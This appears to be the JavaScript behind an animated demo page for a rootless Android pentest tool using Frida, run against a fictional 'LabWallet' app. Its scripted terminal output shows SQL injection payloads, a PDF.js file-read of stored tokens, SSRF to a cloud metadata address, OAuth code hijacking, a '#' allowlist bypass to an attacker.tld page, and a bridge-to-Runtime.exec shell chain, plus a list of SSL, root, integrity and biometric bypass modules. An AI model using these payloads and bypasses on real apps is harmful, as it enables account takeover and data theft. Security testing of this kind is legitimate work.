
/* =========================================================
   TARGET APP SCREENS
   ========================================================= */
var APP={
home:'<div class="hgrid">'+
  ['Phone','Msgs','Maps','Files','Camera','Clock','Notes','Store'].map(function(n){
    return '<div class="hic"><div class="sq"></div>'+n+'</div>';}).join('')+
  '<div class="hic on"><div class="sq"></div>LabWallet</div>'+
  ['Music','Photos','Mail'].map(function(n){
    return '<div class="hic"><div class="sq"></div>'+n+'</div>';}).join('')+
  '</div>',

splash:'<div class="splash"><div class="logo"></div><div class="nm">LabWallet</div>'+
  '<div class="spin"></div><div class="pill">frozen — gadget waiting</div></div>',

starting:'<div class="splash"><div class="logo"></div><div class="nm">LabWallet</div>'+
  '<div class="spin"></div></div>',

login:'<div class="ahdr"><div class="brand"><span class="gem"></span>LabWallet</div></div>'+
  '<div class="abody"><div style="font-size:1.1cqw;font-weight:600;margin-bottom:.6cqh">Welcome back</div>'+
  '<div class="field">name@lab.test</div><div class="field">••••••••••</div>'+
  '<div class="btn">Continue</div><div class="btn ghost">Sign in with LabID</div></div>',

wallet:'<div class="ahdr"><div class="brand"><span class="gem"></span>LabWallet</div><div class="av"></div></div>'+
  '<div class="abody"><div class="bal">TOTAL BALANCE<b>€ 4,812.40</b></div>'+
  '<div class="card"><div class="n">VISA •••• 4417</div><div class="s">primary · € 3,120.00</div></div>'+
  '<div class="card"><div class="n">MASTERCARD •••• 9032</div><div class="s">savings · € 1,692.40</div></div>'+
  '<div class="card"><div class="n">BTC wallet</div><div class="s">0.0213 BTC</div></div></div>'+
  '<div class="abot"><b>Home</b><span>Cards</span><span>Send</span><span>More</span></div>',

cards:'<div class="ahdr"><div class="brand"><span class="gem"></span>Cards</div><div class="av"></div></div>'+
  '<div class="abody"><div class="pill" style="align-self:flex-start">opened by lab://open?ex=1</div>'+
  '<div class="card"><div class="n">VISA •••• 4417</div><div class="s">id=1 · matched</div></div>'+
  '<div class="card"><div class="n">MASTERCARD •••• 9032</div><div class="s">id=2</div></div></div>'+
  '<div class="abot"><span>Home</span><b>Cards</b><span>Send</span><span>More</span></div>',

sqlerr:'<div class="ahdr"><div class="brand"><span class="gem"></span>Cards</div><div class="av"></div></div>'+
  '<div class="abody"><div class="pill r" style="align-self:flex-start">query returned 1 unexpected row</div>'+
  '<div class="card"><div class="n">3.44.5</div><div class="s">rendered as a card name</div></div></div>'+
  '<div class="toast">unhandled cursor column — value shown verbatim</div>'+
  '<div class="abot"><span>Home</span><b>Cards</b><span>Send</span><span>More</span></div>',

oauth:'<div class="ahdr"><div class="brand"><span class="gem"></span>LabID</div></div>'+
  '<div class="abody"><div style="font-size:1cqw;font-weight:600">LabWallet wants access</div>'+
  '<div class="field">profile · read</div><div class="field">accounts · read</div>'+
  '<div class="field">payments · initiate</div>'+
  '<div class="btn">Allow</div><div class="btn ghost">Deny</div>'+
  '<div class="pill" style="align-self:flex-start">redirect: lab://auth/callback</div></div>',

oauthhij:'<div class="ahdr"><div class="brand"><span class="gem"></span>LabID</div></div>'+
  '<div class="abody"><div class="pill r" style="align-self:flex-start">callback claimed by another package</div>'+
  '<div class="field">code = 4/0Ad…  →  com.other.app</div>'+
  '<div class="btn ghost">Allow</div></div>'+
  '<div class="toast">authorization code delivered to the wrong app</div>',

pdf:'<div class="urlbar">file:///android_asset/pdfjs/viewer.html?file=…</div>'+
  '<div class="doc"><div class="h"></div><div class="l m"></div><div class="l s"></div>'+
  '<div class="l m"></div><div class="l s"></div><div class="l m"></div></div>',

pdfleak:'<div class="urlbar">file:///data/data/com.lab.wallet/shared_prefs/auth.xml</div>'+
  '<div class="doc"><div class="h"></div>'+
  '<div class="leak">&lt;string name="access_token"&gt;eyJhbGciOiJIUzI1NiIsInR5cCI6…&lt;/string&gt;</div>'+
  '<div class="leak">&lt;string name="device_key"&gt;MIIEvQIBADANBgkqhkiG9w0BAQ…&lt;/string&gt;</div>'+
  '<div class="l s"></div><div class="l m"></div></div>',

webview:'<div class="urlbar">https://attacker.tld#.lab.test</div>'+
  '<div class="abody" style="background:#101433">'+
  '<div style="font-size:.95cqw;font-weight:600">Verify your session</div>'+
  '<div class="field">loading bridge…</div>'+
  '<div class="pill r" style="align-self:flex-start">AndroidBridge.getTime(cmd)</div></div>',

shell:'<div class="urlbar">https://attacker.tld#.lab.test</div>'+
  '<div class="abody" style="background:#101433">'+
  '<div class="pill r" style="align-self:flex-start">Runtime.exec("id")</div>'+
  '<div class="field" style="font-family:var(--mono);font-size:.58cqw">uid=10247(u0_a247) groups=…</div></div>'+
  '<div class="toast">command executed inside the app sandbox</div>'
};

/* =========================================================
   MODULE DECK
   ========================================================= */
var DC=['#F43F5E','#34D399','#22D3EE','#34D399','#FBBF24','#F472B6','#60A5FA','#A3E635','#FB923C'];
var DECK=[
 ['H','🌐','SURFACE & RECON','★×1','A'],
 ['01','⚙','{c|BuildConfig Auditor}'],['02','🎬','{c|Live Interaction Tracer}'],
 ['03','📐','{w|Auto Recon}'],['04','🔤','{p|Kotlin Name Recovery + Ktor}'],
 ['05','📱','{w|Command Center (auto)} {a|★}  + {r|🎯} {a|forged validator}'],
 ['06','📂','{o|File Explorer}'],['07','💾','{c|Data Dumper}'],['08','🪝','{w|Hooking Console}'],
 ['H','🎯','APP ATTACK SURFACE','★×20','B'],
 ['09','🔴','{w|Intent Interceptor}'],['10','📄','{c|PDF.js LFI + SSRF}'],
 ['11','📁','{m|Cordova/WebView Scanner}'],['12','🌐','{c|Custom Tabs / TWA Hunter} {a|★}'],
 ['13','🚪','{o|Dual-entry + Cookie Taint} {a|★}'],['14','↳','{w|Intent URI Router} {a|★}'],
 ['15','🎟','{p|URI Grant Watcher} {a|★}'],['16','🔗','{c|Deeplink Fuzzer} {a|★}'],
 ['17','🖊','{v|Schema Fuzzer} {a|★}'],['18','📋','{w|Content Provider Fuzzer} {a|★}'],
 ['19','🎯','{c|Intent Hunter} {a|★}'],['20','⚡','{m|Auto-Exploit Chain} {a|★}'],
 ['21','🕴','{o|Provider Confused-Deputy} {a|★}'],['22','🔬','{p|Native Function Tracer} {a|★}'],
 ['23','🖊','{c|Native Overflow Watch} {a|★}'],['24','🗜','{r|Zip-Slip Archive → RCE} {a|★}'],
 ['25','📂','{m|Provider openFile Traversal}'],['26','🔗','{c|Service/AIDL Perm-Bypass} {a|★}'],
 ['27','🌡','{r|Heap/Int Overflow Watch} {a|★}'],['28','🎞','{w|Lottie / dotLottie Probe}'],
 ['29','📶','{b|BLE / Bluetooth Scanner}'],['30','🏗','{c|dsBridge / JSBridge Frameworks}'],
 ['31','🧬','{m|Insecure Deserialization Probe}'],['32','📝','{c|File-Write → Code-Load (Planting)} {a|★}'],
 ['33','🔗','{m|URL-Validation / Open-Redirect} {a|★}'],['34','⛓','{w|Deep Link → Bridge → Shell}'],
 ['35','♿','{c|Accessibility Exposure}'],['36','🧨','{p|Intent Selector (SEL) Bypass}'],
 ['37','🖊','{b|Intent Redirection (runtime taint)}'],['38','🌐','{m|WebView Allowlist Bypass + Harvest}'],
 ['39','🔑','{c|Request Signing Recovery (HMAC→header)}'],['40','🔐','{p|PKCE Probe (authorize→derivation→exchange)}'],
 ['41','🎯','{c|Intent Redirection Hunter} {a|★}'],['42','🔀','{m|Source→Sink Taint Correlator} {a|★}'],
 ['43','🔎','{v|WebView Bridge Deep-Dive} {a|★}'],
 ['H','📡','TRAFFIC & SECRETS','★×5','C'],
 ['44','🦋','{w|Flutter MethodChannel Spy}'],['45','📡','{p|Request Intelligence} {a|★}'],
 ['46','🔍','{d|WebView Inspector}'],['47','🎫','{c|Token Dumper} {a|★}'],
 ['48','🔒','{v|Crypto Interceptor}'],['49','🪙','{m|Native Secret Hunter} {a|★}'],
 ['50','🗝','{d|KeyStore + EncSharedPrefs}'],['51','💳','{w|Credential Manager/Passkey}'],
 ['52','📦','{o|gRPC / Protobuf}'],['53','🔓','{c|WebView TLS Observer} {a|★}'],
 ['54','📥','{r|OkHttp Body Capture (okio-free)}'],['55','🔏','{p|Conscrypt Capture (TLS plaintext)}'],
 ['56','🧩','{m|RN Blob Capture (blobId → body)}'],['57','🎛','{c|Response Tamper (client-trust)} {a|★}'],
 ['H','🧠','NATIVE & RUNTIME','★×3','D'],
 ['58','🧩','{w|JNI RegisterNatives Dumper} {a|★}'],['59','🧠','{p|Memory Forensics} {a|★}'],
 ['60','🔬','{c|Memory Secret Sweep}'],['61','🐚','{m|Interactive Shell}'],
 ['62','💥','{r|Full Pentest}'],['63','🤖','{c|FULL AUTO (surface-aware)} {a|★}'],
 ['H','🛡','DEFENSE BYPASS','★×2','E'],
 ['64','🔒','{c|SSL Bypass} {a|★}'],['65','🦋','{m|Flutter SSL Bypass}'],
 ['66','🛡','{p|RASP / Anti-Frida / Root} {a|★}'],['67','🪪','{v|Play Integrity Inspector}'],
 ['68','👆','{w|Biometric Bypass}'],['69','🌐','{c|Cronet SSL Bypass}'],
 ['70','🔐','{m|mTLS Bypass + Key Extract}'],['71','🥷','{p|Native Anti-Anti-Frida}'],
 ['72','📌','{r|Native/BoringSSL Pinning}'],['73','🪪','{c|Attestation / Integrity Audit}'],
 ['74','😶','{p|Gadget Stealth (/proc + Flutter)}']
];
function deckLines(){
  var out=[],ci=0;
  DECK.forEach(function(r){
    if(r[0]==='H') out.push({t:'out',fast:true,s:'{d|──} '+r[1]+' {m|'+r[2]+'}  {a|'+r[3]+'} {d|['+r[4]+']──────────}'});
    else out.push({t:'out',fast:true,bar:DC[ci++%DC.length],s:'{d|'+r[0]+'} '+r[1]+' '+r[2]});
  });
  return out;
}

/* =========================================================
   WALKTHROUGH
   ========================================================= */
var CH=[
{step:'Set up once', sub:'Everything runs inside Termux on a stock phone. No root, no PC, no cable.',
 focus:'term', app:'home',
 lines:[
  {t:'cmd', s:'pkg install python openjdk-17 apksigner'},
  {t:'out', s:'{m|✓} python 3.12   {m|✓} openjdk-17   {m|✓} apksigner'},
  {t:'cmd', s:'pip install frida-tools'},
  {t:'out', s:'{m|✓} frida-tools 14.2  {d|(core 17.17.0)}'},
  {t:'cmd', s:'python androscope.py check'},
  {t:'out', s:'{d|── dependency check ─────────────────────}'},
  {t:'out', s:'{m|✓} apktool 2.9.3    {m|✓} zipalign'},
  {t:'out', s:'{m|✓} apksigner       {m|✓} frida 17.17.0'},
  {t:'out', s:'{m|✓} aapt2           {m|✓} openssl'},
  {t:'out', s:'{c|all good — nothing else to install}'}
 ],
 notes:[{after:9,k:'m',x:41,y:62,w:24,h:'Run check first',p:'It names the missing package before you waste a full patch cycle.'}]},

{step:'One entry point', sub:'The menu is the tool. Prepare on one side, runtime on the other.',
 focus:'term', app:'home',
 lines:[
  {t:'cmd', s:'python androscope.py'},
  {t:'out', s:'{v|╭─ Andro}{c|SCOPE} {d|12.5}  {d|•} {a|@ynsmroztas}'},
  {t:'out', s:'{d|│ target:} {a|androscope}  {d|mode:} {c|rootless mobile pentest}'},
  {t:'out', s:'{v|╰────────────────────────────────────────}'},
  {t:'out', s:'{d|── prepare ──────────────────────────}'},
  {t:'out', s:'{v| 1.} {c|patch}     {d|merge · analyze · inject · sign}'},
  {t:'out', s:'{v| 2.} {c|analyze}   {d|static surface map}'},
  {t:'out', s:'{v| 3.} {c|audit}     {d|full security audit}'},
  {t:'out', s:'{v| 4.} {c|radar}     {d|exploitability radar}'},
  {t:'out', s:'{d|── runtime ──────────────────────────}'},
  {t:'out', s:'{v| 5.} {c|connect}   {d|session plan + modules}'},
  {t:'out', s:'{v| 6.} {c|shell}     {d|interactive frida shell}'},
  {t:'out', s:'{d|❯} {a|1}'}
 ],
 notes:[{after:12,k:'c',x:41,y:56,w:25,h:'Start at 1',p:'patch runs the entire prep chain in one pass.'}]},

{step:'Any build, bundles included', sub:'Split bundles are flattened before anything else touches them — this is where most rootless setups die.',
 focus:'term', app:'home',
 lines:[
  {t:'out', s:'{d|── select target ────────────────────}'},
  {t:'out', s:'{v| 1.} labwallet_4.2.0{a|.xapk}   {d|447 MB}'},
  {t:'out', s:'{v| 2.} other_app.apk           {d|62 MB}'},
  {t:'out', s:'{d|❯} {a|1}'},
  {t:'out', s:''},
  {t:'out', s:'{a|▲} bundle detected — 6 splits'},
  {t:'out', s:'{d|  base.apk + config.arm64_v8a + 4 config}'},
  {t:'out', s:'{m|✓} base identified by content (manifest + dex)'},
  {t:'out', s:'{m|✓} arm64-v8a splits kept, others dropped'},
  {t:'out', s:'{m|✓} lib/**.so written STORED (mmap-able)'},
  {t:'out', s:'{m|✓} resources.arsc kept STORED'},
  {t:'out', s:'{m|✓} split markers neutralised in manifest'},
  {t:'out', s:'{m|✓} zipalign -p -f 4'},
  {t:'out', s:'{c|universal.apk} {d|223 MB — ready}'}
 ],
 notes:[{after:6,k:'a',x:41,y:32,w:25,h:'.xapk no longer dies',
         p:'Native libs live in the config splits. Patch base alone and the app installs, then vanishes on launch.'},
        {after:10,k:'m',x:41,y:70,w:24,h:'Why STORED matters',
         p:'Android mmaps resources.arsc since API 30. Compress it and the install is refused.'}]},

{step:'Read the app first', sub:'The static pass is authoritative — it decides every runtime step that follows.',
 focus:'term', app:'home',
 lines:[
  {t:'out', s:'{d|── app analysis ─────────────────────}'},
  {t:'out', s:'{d|package}   {c|com.lab.wallet}'},
  {t:'out', s:'{d|version}   4.2.0  {d|targetSdk 34}'},
  {t:'out', s:'{d|dex}       1 file · 14,203 classes'},
  {t:'out', s:'{d|native}    2 libs · arm64-v8a'},
  {t:'out', s:'{d|schemes}   {a|lab://}  {a|labwallet://}  https'},
  {t:'out', s:'{d|links}     {a|17 deep-link URIs}'},
  {t:'out', s:'{d|exported}  3 activities · 1 provider · 2 services'},
  {t:'out', s:'{d|webview}   {r|addJavascriptInterface  AndroidBridge}'},
  {t:'out', s:'{d|viewer}    {r|pdf.js 2.14.305 (bundled asset)}'},
  {t:'out', s:'{d|sql}       rawQuery on a deep-link path'},
  {t:'out', s:'{d|oauth}     authorize + custom-scheme callback'},
  {t:'out', s:'{c|surface map built — 74 modules loaded}'}
 ],
 notes:[{after:8,k:'r',x:41,y:48,w:26,h:'These lines set the plan',
         p:'A JS bridge, a bundled pdf.js and a raw SQL sink on the link path — three chains, all reachable from outside.'}]},

{step:'Inject the gadget', sub:'Frida Gadget goes into a library the app loads at startup. That is what replaces root.',
 focus:'term', app:'home',
 lines:[
  {t:'out', s:'{d|── lib-inject ───────────────────────}'},
  {t:'out', s:'{d|startup libs found:}'},
  {t:'out', s:'{v| 1.} libflutter.so   {d|loaded first · 41 MB}'},
  {t:'out', s:'{v| 2.} libapp.so       {d|loaded second}'},
  {t:'out', s:'{d|❯} {a|1}'},
  {t:'out', s:'{m|✓} gadget 17.17.0 arm64-v8a embedded'},
  {t:'out', s:'{m|✓} System.loadLibrary chain patched'},
  {t:'out', s:'{d|gadget mode:} {a|wait} {d|/ resume}   {d|❯} {a|wait}'},
  {t:'out', s:'{m|✓} libgadget.config.so written'},
  {t:'out', s:'{d|  socket 127.0.0.1:27042 · on_load: wait}'}
 ],
 notes:[{after:7,k:'a',x:41,y:60,w:26,h:'Pick wait mode',
         p:'The app freezes at the splash and waits for you. In resume mode its tamper checks race you — and win.'}]},

{step:'Install it and watch', sub:'Out comes a normal APK. You tap install, open it — and it stops at the splash screen.',
 focus:'duo', hold:3800,
 lines:[
  {t:'out', s:'{m|✓} old META-INF signatures dropped'},
  {t:'out', s:'{m|✓} re-signed with androscope test key'},
  {t:'out', s:'{m|✓} zipaligned 4-byte'},
  {t:'out', s:'{c|labwallet_fridhunter.apk} {d|written · 224 MB}'},
  {t:'out', s:'{d|install it, then open it}', app:'starting'},
  {t:'out', s:''},
  {t:'cmd', s:'frida-ps -H 127.0.0.1:27042'},
  {t:'out', s:'{d|  PID  NAME}'},
  {t:'out', s:'{m| 8412  Gadget}   {d|← listening}', app:'splash'}
 ],
 notes:[{after:8,k:'m',x:53,y:24,w:24,h:'Frozen splash = success',
         p:'The gadget opened its socket before the app finished starting. If it boots normally instead, re-patch.'}]},

{step:'Get your session plan', sub:'connect turns static findings into an ordered plan, with a reason behind every step.',
 focus:'term', app:'splash',
 lines:[
  {t:'cmd', s:'python androscope.py connect'},
  {t:'out', s:'{d|── session plan · com.lab.wallet ─────}'},
  {t:'out', s:'{a|01} {c|Deep-link surface}      {d|17 URIs, 3 exported}'},
  {t:'out', s:'{a|02} {c|WebView bridge}         {d|AndroidBridge found}'},
  {t:'out', s:'{a|03} {c|PDF.js viewer}          {d|file:// reachable?}'},
  {t:'out', s:'{a|04} {c|OAuth + PKCE}           {d|custom scheme}'},
  {t:'out', s:'{a|05} {c|Raw SQL sinks}          {d|on the link path}'},
  {t:'out', s:'{a|06} {c|Token + secret sweep}   {d|after auth}'},
  {t:'out', s:'{d|❯} {c|why(4)}'},
  {t:'out', s:'{d|promoted: redirect_uri is a custom scheme and}'},
  {t:'out', s:'{d|2 other packages resolve it — static, manifest}'}
 ],
 notes:[{after:10,k:'c',x:41,y:66,w:26,h:'why() keeps it honest',
         p:'Every step traces back to something the static pass actually saw. Nothing here is a guess.'}]},

{step:'74 modules, nothing hidden', sub:'The expert deck. Stars mark what is relevant to this app — the rest stays one number away.',
 focus:'wide', hold:5000, app:'login',
 lines:[{t:'cmd', s:'d'},
   {t:'out', s:'{d|ℹ} Expert deck — every module, nothing hidden'},
   {t:'out', s:''},
   {t:'out', s:'{v|♦} {w|MODULE DECK}  {d|· 74 loaded ·} {a|★} {d|= relevant to this app}'},
   {t:'out', s:''}].concat(deckLines()),
 notes:[{after:4,k:'v',x:58,y:20,w:26,h:'Grouped A–E',
         p:'Load a whole group with one letter, or one module by number. Nothing loads that this app cannot use.'}]},

{step:'Arm everything at once', sub:'auto() loads the modules this app needs and reports only what it can prove.',
 focus:'term', app:'login',
 lines:[
  {t:'cmd', s:'frida -H 127.0.0.1:27042 -n Gadget \\'},
  {t:'cmd', s:'  -l rasp_bypass.js -l command_center.js'},
  {t:'out', s:'{d|[Gadget]->} {c|auto()}'},
  {t:'out', s:'{m|✓} rasp bypass      {d|root · anti-frida · installer}'},
  {t:'out', s:'{m|✓} ssl bypass       {d|java · boringssl · flutter}'},
  {t:'out', s:'{m|✓} ssl_raw_capture  {d|SSL_read/SSL_write, ALPN→h1}'},
  {t:'out', s:'{m|✓} deep-link + intent tracker'},
  {t:'out', s:'{m|✓} sqlite sink watch · webview bridge watch'},
  {t:'out', s:'{m|✓} oauth/pkce probe · token dumper'},
  {t:'out', s:'{d|capture health: 6/6 armed · 0 crashes}'},
  {t:'out', s:'{c|drive the app — findings print as they land}', app:'wallet'}
 ],
 notes:[{after:9,k:'m',x:41,y:66,w:26,h:'One session, one process',
         p:'Both scripts share the process, so a crash in one kills the other. v12.5 exists because of that bug.'}]},

{step:'SQL injection, confirmed', sub:'A deep-link value reaches raw SQL unbound. The cursor is read back, so the finding arrives with its own proof.',
 focus:'duo', hold:4200,
 lines:[
  {t:'cmd', s:'am start -d "lab://open?ex=1"', app:'cards'},
  {t:'out', s:'{d|[link]} lab://open?ex=1  → CardsActivity'},
  {t:'out', s:'{d|[sql ]} rawQuery("SELECT * FROM cards WHERE"'},
  {t:'out', s:'{d|        + " id=\'" + ex + "\'")   {r|← unbound}'},
  {t:'out', s:'{a|[MEDIUM]} link value reaches raw SQL — PoC ready'},
  {t:'out', s:'{d|❯} {c|sqliPoc("lab://open?ex=1","ex")}'},
  {t:'out', s:'{a| quote-break }{d|…?ex=1\'}'},
  {t:'out', s:'{a| union-finger}{d|…?ex=1\' UNION SELECT sqlite_version()--}'},
  {t:'out', s:'{a| schema-dump }{d|…\' UNION SELECT name FROM sqlite_master--}'},
  {t:'out', s:'{a| blind-true  }{d|…?ex=1\' AND \'1\'=\'1}'},
  {t:'cmd', s:'am start -d "lab://open?ex=1\' UNION SELECT…"', app:'sqlerr'},
  {t:'out', s:'{m|[PROOF]} cursor row0 = {a|3.44.5}'},
  {t:'out', s:'{r|[CRITICAL]} SQL injection CONFIRMED — exploitable'}
 ],
 notes:[{after:11,k:'r',x:53,y:26,w:25,h:'The app renders the proof',
         p:'The injected sqlite_version() comes back as a card name. Shape alone was MEDIUM; this makes it CRITICAL.'}]},

{step:'Read the whole database', sub:'Once one query is confirmed, the live SQLiteDatabase handle is already yours — no more injection needed.',
 focus:'term', app:'sqlerr',
 lines:[
  {t:'out', s:'{d|❯} {c|sqliDumpSchema()}'},
  {t:'out', s:'{m|14 tables} {d|(direct sqlite_master on LIVE_DB)}'},
  {t:'out', s:'{d| auth_session   oauth_token   user_pii}'},
  {t:'out', s:'{d| cards          device_keys   kyc_docs}'},
  {t:'out', s:'{d|❯} {c|sqliDumpTable("oauth_token", 3)}'},
  {t:'out', s:'{d| id | access_token          | refresh    | exp}'},
  {t:'out', s:'{a| 1  | eyJhbGciOiJIUzI1NiIs… | rt_9f3c1b… | 1790…}'},
  {t:'out', s:'{a| 2  | eyJhbGciOiJIUzI1NiIs… | rt_4a71e2… | 1790…}'},
  {t:'out', s:'{d|❯} {c|sqliDumpTable("user_pii", 2)}'},
  {t:'out', s:'{a| full_name · dob · national_id · iban}'},
  {t:'out', s:'{m|this is the impact screenshot the report needs}'}
 ],
 notes:[{after:10,k:'m',x:41,y:70,w:26,h:'Deliberately manual',
         p:'Nothing auto-dumps user data. You decide when a finding is worth the evidence.'}]},

{step:'PKCE, end to end', sub:'The probe follows one code through authorize, derivation and exchange — then checks who else can catch the callback.',
 focus:'duo', hold:4200,
 lines:[
  {t:'out', s:'{d|❯} {c|pkceProbe()}', app:'oauth'},
  {t:'out', s:'{d|── PKCE · authorize → derivation → exchange ──}'},
  {t:'out', s:'{d|authorize } GET /oauth/authorize'},
  {t:'out', s:'{d|           response_type={a|code}  state={m|32B ok}'},
  {t:'out', s:'{d|           code_challenge={r|MISSING}'},
  {t:'out', s:'{d|           code_challenge_method={r|—}'},
  {t:'out', s:'{d|derivation} no S256 over any observed verifier'},
  {t:'out', s:'{d|exchange  } POST /oauth/token'},
  {t:'out', s:'{d|           code_verifier={r|absent}  secret={r|absent}'},
  {t:'out', s:'{r|[CRITICAL]} public client without PKCE'},
  {t:'out', s:'{d|❯} {c|oauthAudit()}'},
  {t:'out', s:'{d|redirect_uri} {a|lab://auth/callback}'},
  {t:'out', s:'{d|resolvers   } {r|3 packages can receive it}'},
  {t:'out', s:'{d|app links   } {r|not verified — no assetlinks.json}'},
  {t:'out', s:'{d|❯} {c|oauthHijack()}', app:'oauthhij'},
  {t:'out', s:'{r|[CRITICAL]} authorization code intercepted'}
 ],
 notes:[{after:9,k:'r',x:53,y:24,w:25,h:'Checked at every layer',
         p:'Missing PKCE alone is a finding. Missing PKCE plus a scheme three apps can claim is account takeover.'}]},

{step:'LFI through the PDF viewer', sub:'A bundled pdf.js reachable from a deep link reads the app\'s own private files — then reaches outward.',
 focus:'duo', hold:4200,
 lines:[
  {t:'out', s:'{d|❯} {c|pdfLfi()}', app:'pdf'},
  {t:'out', s:'{d|── PDF.js LFI + SSRF ────────────────}'},
  {t:'out', s:'{d|viewer  } pdf.js 2.14.305 {d|(assets/pdfjs/)}'},
  {t:'out', s:'{d|entry   } {a|lab://doc?file=}'},
  {t:'out', s:'{d|settings} allowFileAccess={r|true}  universal={r|true}'},
  {t:'out', s:'{r|[CRITICAL]} file:// reachable from a deep link'},
  {t:'out', s:'{d|❯} {c|pdfRead("/data/data/com.lab.wallet/}'},
  {t:'out', s:'{c|   shared_prefs/auth.xml")}', app:'pdfleak'},
  {t:'out', s:'{m|✓} 1,204 bytes read into the viewer context'},
  {t:'out', s:'{a| access_token  eyJhbGciOiJIUzI1NiIs…}'},
  {t:'out', s:'{a| device_key    MIIEvQIBADANBgkqhkiG…}'},
  {t:'out', s:'{d|❯} {c|pdfSsrf("http://169.254.169.254/latest/")}'},
  {t:'out', s:'{a|[HIGH]} outbound fetch executed from the viewer'}
 ],
 notes:[{after:8,k:'r',x:53,y:26,w:25,h:'The viewer reads its own app',
         p:'shared_prefs is private storage, but the viewer runs inside the app — the sandbox does not help here.'}]},

{step:'Deep link → bridge → shell', sub:'The chain that ends in command execution, fired automatically against every candidate URI.',
 focus:'duo', hold:4200,
 lines:[
  {t:'out', s:'{d|❯} {c|dlChain()}'},
  {t:'out', s:'{d|fired 17 candidates ×2 (implicit + explicit)}'},
  {t:'out', s:'{d|allowlist} endsWith("lab.test") {r|bypassed with #}'},
  {t:'out', s:'{d|loaded   } https://attacker.tld#.lab.test', app:'webview'},
  {t:'out', s:'{d|bridge   } {a|AndroidBridge.getTime(cmd)}'},
  {t:'out', s:'{d|sink     } {r|Runtime.exec} hit 340ms after the call', app:'shell'},
  {t:'out', s:'{r|[CRITICAL]} deep link → bridge → shell CONFIRMED'},
  {t:'out', s:'{d|❯} {c|dlPoc()}'},
  {t:'out', s:'{d| am start -a android.intent.action.VIEW \\}'},
  {t:'out', s:'{d|   -d "lab://open?url=https://attacker.tld#."}'},
  {t:'out', s:'{a| 2 other packages resolve the same URI}'}
 ],
 notes:[{after:6,k:'r',x:53,y:26,w:25,h:'CONFIRMED means a sink fired',
         p:'Reachability alone is not the verdict. The bridge call has to land on exec inside the window.'}]},

{step:'One timeline, one bundle', sub:'Every module wrote into the same chronological log. Export it and the report writes itself.',
 focus:'term', app:'shell',
 lines:[
  {t:'out', s:'{d|❯} {c|exportAll()}'},
  {t:'out', s:'{d|── session summary ──────────────────}'},
  {t:'out', s:'{r| 2 CRITICAL} sql injection · bridge → shell'},
  {t:'out', s:'{r| 2 CRITICAL} pdf.js LFI · missing PKCE'},
  {t:'out', s:'{a| 3 HIGH    } ssrf · redirect hijack · token leak'},
  {t:'out', s:'{c| 6 MEDIUM  } flag_secure · clipboard · allowlist'},
  {t:'out', s:'{m|✓} timeline.md      {d|chronological, deduped}'},
  {t:'out', s:'{m|✓} session.har      {d|full request/response}'},
  {t:'out', s:'{m|✓} evidence/        {d|per-finding proof files}'},
  {t:'out', s:'{m|✓} plan_feedback.json {d|carries to next session}'},
  {t:'out', s:'{c|done — 41 minutes, one phone, no root}'}
 ],
 notes:[{after:10,k:'m',x:41,y:70,w:26,h:'Straight into the submission',
         p:'Markdown timeline, HAR and the raw evidence folder. Nothing to reconstruct afterwards.'}]}
];

/* =========================================================
   WEBGL BACKGROUND
   ========================================================= */
var stage=document.getElementById('stage'), canvas=document.getElementById('gl');
var reduce=window.matchMedia('(prefers-reduced-motion: reduce)').matches;
var renderer,scene3,cam3,rings=[],pts,shards=[];
var V=0x34D399,C=0x22D3EE,M=0x34D399,A=0xFBBF24,R=0xF43F5E,PAL=[V,C,M,A,R];
function initGL(){
  renderer=new THREE.WebGLRenderer({canvas:canvas,antialias:true,alpha:true});
  renderer.setPixelRatio(Math.min(window.devicePixelRatio||1,2));
  scene3=new THREE.Scene(); scene3.fog=new THREE.FogExp2(0x07110e,0.05);
  cam3=new THREE.PerspectiveCamera(45,16/9,0.1,100); cam3.position.set(2,0.4,9);
  scene3.add(new THREE.AmbientLight(0x145c48,0.9));
  var l1=new THREE.PointLight(V,2.2,40); l1.position.set(-6,3,5); scene3.add(l1);
  var l2=new THREE.PointLight(C,1.8,40); l2.position.set(6,-2,4); scene3.add(l2);
  [{r:3.6,c:V},{r:4.6,c:C},{r:5.6,c:A}].forEach(function(d,i){
    var m=new THREE.Mesh(new THREE.TorusGeometry(d.r,0.01,8,150),
      new THREE.MeshBasicMaterial({color:d.c,transparent:true,opacity:0.3,blending:THREE.AdditiveBlending}));
    m.rotation.x=Math.PI/2+(i-1)*0.4; m.position.x=3;
    m.userData={s:0.0014+i*0.0008}; rings.push(m); scene3.add(m);
  });
  for(var i=0;i<22;i++){
    var s=Math.random()*0.2+0.07;
    var mesh=new THREE.Mesh(new THREE.BoxGeometry(s,s*1.3,s*0.3),
      new THREE.MeshStandardMaterial({color:PAL[i%5],emissive:PAL[i%5],emissiveIntensity:0.35,
        metalness:0.6,roughness:0.3,transparent:true,opacity:0.7}));
    var a1=Math.random()*6.28,a2=Math.acos(2*Math.random()-1);
    mesh.userData={base:new THREE.Vector3(Math.sin(a2)*Math.cos(a1),Math.cos(a2),Math.sin(a2)*Math.sin(a1))
      .multiplyScalar(3.2+Math.random()*2.6),
      spin:new THREE.Vector3((Math.random()-.5)*.02,(Math.random()-.5)*.02,(Math.random()-.5)*.02),
      ph:Math.random()*6.28};
    shards.push(mesh); scene3.add(mesh);
  }
  var N=900,pos=new Float32Array(N*3),col=new Float32Array(N*3),cc=new THREE.Color();
  for(var j=0;j<N;j++){
    var rr=8+Math.random()*15,th=Math.random()*6.28,ph=Math.acos(2*Math.random()-1);
    pos[j*3]=rr*Math.sin(ph)*Math.cos(th); pos[j*3+1]=rr*Math.cos(ph)*0.5; pos[j*3+2]=rr*Math.sin(ph)*Math.sin(th);
    cc.setHex(PAL[j%5]); col[j*3]=cc.r; col[j*3+1]=cc.g; col[j*3+2]=cc.b;
  }
  var pg=new THREE.BufferGeometry();
  pg.setAttribute('position',new THREE.BufferAttribute(pos,3));
  pg.setAttribute('color',new THREE.BufferAttribute(col,3));
  pts=new THREE.Points(pg,new THREE.PointsMaterial({size:0.055,vertexColors:true,transparent:true,
    opacity:0.62,blending:THREE.AdditiveBlending,depthWrite:false}));
  scene3.add(pts);
  resizeGL(); window.addEventListener('resize',resizeGL);
}
function resizeGL(){ if(!renderer) return;
  var w=stage.clientWidth,h=stage.clientHeight;
  renderer.setSize(w,h,false); cam3.aspect=w/h; cam3.updateProjectionMatrix(); }
function renderGL(t,dt){
  if(!renderer) return;
  cam3.position.x=2+(reduce?0:Math.sin(t*0.26)*0.45);
  cam3.position.y=0.4+(reduce?0:Math.cos(t*0.2)*0.28);
  cam3.lookAt(3,0,0);
  rings.forEach(function(rg){ rg.rotation.z+=rg.userData.s*dt*0.06; });
